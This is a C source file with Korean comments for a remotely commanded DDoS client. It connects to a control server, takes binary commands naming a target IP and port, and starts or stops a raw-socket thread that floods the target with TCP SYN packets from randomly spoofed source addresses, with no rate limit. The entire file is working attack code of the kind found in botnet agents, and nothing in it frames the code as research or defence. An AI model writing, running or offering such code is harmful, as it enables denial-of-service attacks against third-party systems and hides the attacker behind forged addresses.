// client.c (명령 구조체 기반 수신)
// Compile: gcc client.c -o client -lpthread
// Run: sudo ./client

#include <stdio.h>
#include <stdatomic.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <sys/time.h>

#define SERVER_IP   "127.0.0.1"
#define SERVER_PORT 8080

// ─────────────────────────────────────
// 명령 구조체 정의
// ─────────────────────────────────────
#pragma pack(push, 1)
typedef struct {
    uint32_t target_ip;     // IPv4 주소
    uint16_t target_port;   // 포트 (네트워크 바이트 순서 예상)
    uint8_t  state;         // 0: stop, 1: start
    uint8_t  padding;       // 항상 0
} command_t;
#pragma pack(pop)

// ─────────────────────────────────────
// 글로벌 상태
// ─────────────────────────────────────
static _Atomic int running = 1;
static _Atomic int attack_running = 0;

static char g_target_ip[64] = {0};
static int  g_target_port = 0;

static pthread_t attack_th;
static _Atomic int attack_th_alive = 0;

// ─────────────────────────────────────
// 체크섬 계산
// ─────────────────────────────────────
unsigned short checksum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    unsigned short oddbyte;
    unsigned short answer;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char*)&oddbyte) = *(unsigned char*)ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;
    return answer;
}

unsigned int get_random_uint() {
    unsigned int r;
    int fd = open("/dev/urandom", O_RDONLY);
    if (fd < 0 || read(fd, &r, sizeof(r)) != sizeof(r)) {
        perror("urandom error");
        exit(1);
    }
    close(fd);
    return r;
}

// ─────────────────────────────────────
// 공격 스레드
// ─────────────────────────────────────
static void* attack_thread_fn(void *arg) {
    attack_th_alive = 1;
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0) {
        perror("[ATTACK] raw socket");
        attack_th_alive = 0;
        return NULL;
    }

    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    char datagram[4096];
    struct iphdr  *iph  = (struct iphdr *) datagram;
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));

    printf("[ATTACK] 공격 스레드 시작\n");
    unsigned long sent = 0;

    while (running) {
        if (!attack_running) {
            usleep(50000);
            continue;
        }

        char ip_local[64];
        int  port_local;
        strncpy(ip_local, g_target_ip, sizeof(ip_local) - 1);
        port_local = g_target_port;

        struct sockaddr_in sin;
        sin.sin_family = AF_INET;
        sin.sin_port   = htons(port_local);
        inet_pton(AF_INET, ip_local, &sin.sin_addr);

        memset(datagram, 0, sizeof(datagram));

        uint32_t source_ip = get_random_uint();
        iph->ihl = 5; iph->version = 4; iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        iph->id = htons(get_random_uint() % 65535);
        iph->frag_off = 0; iph->ttl = 64;
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = checksum((unsigned short*)datagram, sizeof(struct iphdr) + sizeof(struct tcphdr));

        tcph->source = htons(get_random_uint() % 65535);
        tcph->dest = htons(port_local);
        tcph->seq = htonl(get_random_uint());
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->syn = 1;
        tcph->window = htons(1024);
        tcph->check = 0;

        struct pseudo_header {
            uint32_t source_address;
            uint32_t dest_address;
            uint8_t placeholder;
            uint8_t protocol;
            uint16_t tcp_length;
        } psh;

        psh.source_address = source_ip;
        psh.dest_address = sin.sin_addr.s_addr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr));

        char pseudo_packet[sizeof(psh) + sizeof(struct tcphdr)];
        memcpy(pseudo_packet, &psh, sizeof(psh));
        memcpy(pseudo_packet + sizeof(psh), tcph, sizeof(struct tcphdr));
        tcph->check = checksum((unsigned short*)pseudo_packet, sizeof(pseudo_packet));

        ssize_t ret = sendto(s, datagram, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                             (struct sockaddr *)&sin, sizeof(sin));
        if (ret >= 0) sent++;

        // 적절히 sleep 조정 가능
        // usleep(1000);
    }

    printf("[ATTACK] 종료됨 (total sent: %lu)\n", sent);
    close(s);
    attack_th_alive = 0;
    return NULL;
}

static int start_attack(const char *ip, int port) {
    strncpy(g_target_ip, ip, sizeof(g_target_ip) - 1);
    g_target_ip[sizeof(g_target_ip) - 1] = '\0';
    g_target_port = port;

    if (!attack_th_alive) {
        if (pthread_create(&attack_th, NULL, attack_thread_fn, NULL) != 0) {
            perror("[!] 공격 스레드 생성 실패");
            return -1;
        }
        usleep(100000);
    }

    attack_running = 1;
    printf("[ATTACK] 시작: %s:%d\n", g_target_ip, g_target_port);
    return 0;
}

static void stop_attack(void) {
    attack_running = 0;
    printf("[ATTACK] 중지 요청됨\n");
}

// ─────────────────────────────────────
// 서버 명령 수신 스레드 (이진 구조체 기반)
// ─────────────────────────────────────
static void* recv_thread(void* arg) {
    int sock = *(int*)arg;

    while (running) {
        command_t cmd;
        ssize_t n = recv(sock, &cmd, sizeof(cmd), 0);
        if (n == 0) {
            printf("[SERVER] 연결 종료됨\n");
            running = 0;
            break;
        } else if (n < 0) {
            if (errno == EINTR || errno == EAGAIN) continue;
            perror("recv");
            running = 0;
            break;
        } else if (n != sizeof(cmd)) {
            fprintf(stderr, "[!] 명령 수신 오류 (수신 크기 %zd)\n", n);
            continue;
        }

        char ip_str[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &cmd.target_ip, ip_str, sizeof(ip_str));
        int port = ntohs(cmd.target_port);

        if (cmd.state == 1) {
            start_attack(ip_str, port);
        } else {
            stop_attack();
        }
    }
    return NULL;
}

// ─────────────────────────────────────
// 메인 함수
// ─────────────────────────────────────
int main(void) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) { perror("socket"); return 1; }

    struct sockaddr_in sa;
    sa.sin_family = AF_INET;
    sa.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &sa.sin_addr);

    if (connect(sock, (struct sockaddr*)&sa, sizeof(sa)) == -1) {
        perror("connect");
        close(sock);
        return 1;
    }

    puts("서버에 연결되었습니다. q 입력 시 종료됩니다.");

    pthread_t th;
    if (pthread_create(&th, NULL, recv_thread, &sock) != 0) {
        perror("pthread_create");
        close(sock);
        return 1;
    }

    while (1) {
        int c = getchar();
        if (c == 'q' || c == EOF) {
            running = 0;
            break;
        }
    }

    stop_attack();
    if (attack_th_alive) pthread_join(attack_th, NULL);

    shutdown(sock, SHUT_RDWR);
    pthread_join(th, NULL);
    close(sock);
    return 0;
}
